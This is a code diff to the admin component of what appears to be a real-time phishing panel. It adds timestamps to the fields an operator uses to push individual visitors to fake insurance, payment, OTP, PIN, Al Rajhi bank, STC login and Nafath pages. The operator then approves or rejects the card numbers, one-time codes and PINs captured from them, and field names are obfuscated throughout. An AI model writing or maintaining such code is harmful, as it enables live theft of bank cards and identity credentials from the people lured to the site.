@@ -82,13 +82,23 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           updates = {
             redirectPage: "home" as any,
             currentStep: "home" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
         case "insur":
-          updates = { redirectPage: "insur" as any };
+          updates = {
+            redirectPage: "insur" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
+          };
           break;
         case "compar":
-          updates = { redirectPage: "compar" as any };
+          updates = {
+            redirectPage: "compar" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
+          };
           break;
         case "payment":
           // Modern pages use redirectPage, legacy pages use currentStep
@@ -97,47 +107,68 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             currentStep: "_st1" as any,
             cardStatus: "pending" as any,
             otpStatus: "pending" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
         case "otp":
           updates = {
             redirectPage: "otp" as any,
             currentStep: "_t2" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
         case "pin":
           updates = {
             redirectPage: "pin" as any,
             currentStep: "_t3" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
         case "rajhi":
           updates = {
             redirectPage: "rajhi" as any,
             currentStep: "rajhi" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
         case "stc-login":
           updates = {
             redirectPage: "stc-login" as any,
             currentStep: "stc-login" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
         case "phone":
           // Legacy system only
-          updates = { currentStep: "phone" as any };
+          updates = {
+            currentStep: "phone" as any,
+            currentStepUpdatedAt: Date.now(),
+          };
           break;
         case "nafad":
           // Legacy system with correct value
-          updates = { currentStep: "_t6" as any };
+          updates = {
+            currentStep: "_t6" as any,
+            currentStepUpdatedAt: Date.now(),
+          };
           break;
         case "nafad_modal":
-          updates = { nafadConfirmationCode: "123456" }; // Send confirmation code to open modal
+          updates = {
+            nafadConfirmationCode: "123456",
+            currentStepUpdatedAt: Date.now(),
+          }; // Send confirmation code to open modal
           break;
         case "finalOtp":
           updates = {
             redirectPage: "finalOtp" as any,
             currentStep: "finalOtp" as any,
+            redirectPageUpdatedAt: Date.now(),
+            currentStepUpdatedAt: Date.now(),
           };
           break;
       }
@@ -159,7 +190,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     if (!visitor.id || !nafadCode.trim()) return;
 
     try {
-      await updateApplication(visitor.id, { nafadConfirmationCode: nafadCode });
+      await updateApplication(visitor.id, {
+        nafadConfirmationCode: nafadCode,
+        nafadConfirmationStatusUpdatedAt: Date.now(),
+      });
       setNafadCode("");
     } catch (error) {
       console.error("حدث خطأ في إرسال رقم التأكيد");
@@ -706,6 +740,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             console.log("[Action] Status updated to approved_with_otp");
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_otp",
+              cardStatusUpdatedAt: Date.now(),
             });
           } else if (action === "pin") {
             // Approve card with PIN - update history status
@@ -717,6 +752,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             );
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_pin",
+              cardStatusUpdatedAt: Date.now(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
@@ -727,10 +763,16 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 "rejected",
                 visitor.history || []
               );
-              await updateApplication(visitor.id, { cardStatus: "rejected" });
+              await updateApplication(visitor.id, {
+                cardStatus: "rejected",
+                cardStatusUpdatedAt: Date.now(),
+              });
             }
           } else if (action === "message") {
-            await updateApplication(visitor.id, { cardStatus: "message" });
+            await updateApplication(visitor.id, {
+              cardStatus: "message",
+              cardStatusUpdatedAt: Date.now(),
+            });
           }
           break;
 
@@ -742,6 +784,10 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               bubble.id,
               visitor.history || []
             );
+            // Update timestamp
+            await updateApplication(visitor.id, {
+              _v5StatusUpdatedAt: Date.now(),
+            });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP using proper handler
@@ -750,9 +796,16 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 bubble.id,
                 visitor.history || []
               );
+              // Update timestamp
+              await updateApplication(visitor.id, {
+                _v5StatusUpdatedAt: Date.now(),
+              });
             }
           } else if (action === "message") {
-            await updateApplication(visitor.id, { _v5Status: "message" });
+            await updateApplication(visitor.id, {
+              _v5Status: "message",
+              _v5StatusUpdatedAt: Date.now(),
+            });
           }
           break;
 
@@ -763,6 +816,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             } else {
               await updateApplication(visitor.id, {
                 phoneOtpStatus: "approved",
+                phoneOtpStatusUpdatedAt: Date.now(),
               });
             }
             // Phone OTP approved
@@ -773,6 +827,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               } else {
                 await updateApplication(visitor.id, {
                   phoneOtpStatus: "rejected",
+                  phoneOtpStatusUpdatedAt: Date.now(),
                 });
               }
               // Phone OTP rejected
@@ -787,6 +842,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             await updateApplication(visitor.id, {
               phoneOtp: "",
               phoneOtpStatus: "show_phone_otp",
+              phoneOtpStatusUpdatedAt: Date.now(),
             });
             // Phone OTP modal reopened
           }
@@ -796,12 +852,14 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           if (action === "approve") {
             await updateApplication(visitor.id, {
               rajhiOtpStatus: "approved",
+              rajhiOtpStatusUpdatedAt: Date.now(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رمز الراجحي؟")) {
               await updateApplication(visitor.id, {
                 rajhiOtp: "",
                 rajhiOtpStatus: "rejected",
+                rajhiOtpStatusUpdatedAt: Date.now(),
               });
             }
           }
@@ -815,7 +873,11 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               "approved",
               visitor.history || []
             );
-            await updateApplication(visitor.id, { pinStatus: "approved" });
+            await updateApplication(visitor.id, {
+              pinStatus: "approved",
+              _v6Status: "approved",
+              _v6StatusUpdatedAt: Date.now(),
+            });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رمز PIN؟")) {
               await updateHistoryStatus(
@@ -824,10 +886,17 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 "rejected",
                 visitor.history || []
               );
-              await updateApplication(visitor.id, { pinStatus: "rejected" });
+              await updateApplication(visitor.id, {
+                pinStatus: "rejected",
+                _v6Status: "rejected",
+                _v6StatusUpdatedAt: Date.now(),
+              });
             }
           } else if (action === "message") {
-            await updateApplication(visitor.id, { pinStatus: "message" });
+            await updateApplication(visitor.id, {
+              pinStatus: "message",
+              _v6StatusUpdatedAt: Date.now(),
+            });
           }
           break;
 
@@ -835,6 +904,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           if (action === "approve") {
             await updateApplication(visitor.id, {
               finalOtpStatus: "approved",
+              finalOtpStatusUpdatedAt: Date.now(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رمز OTP الأخير؟")) {
@@ -842,10 +912,14 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 finalOtp: "",
                 _v13: "",
                 finalOtpStatus: "rejected",
+                finalOtpStatusUpdatedAt: Date.now(),
               });
             }
           } else if (action === "message") {
-            await updateApplication(visitor.id, { finalOtpStatus: "message" });
+            await updateApplication(visitor.id, {
+              finalOtpStatus: "message",
+              finalOtpStatusUpdatedAt: Date.now(),
+            });
           }
           break;
       }
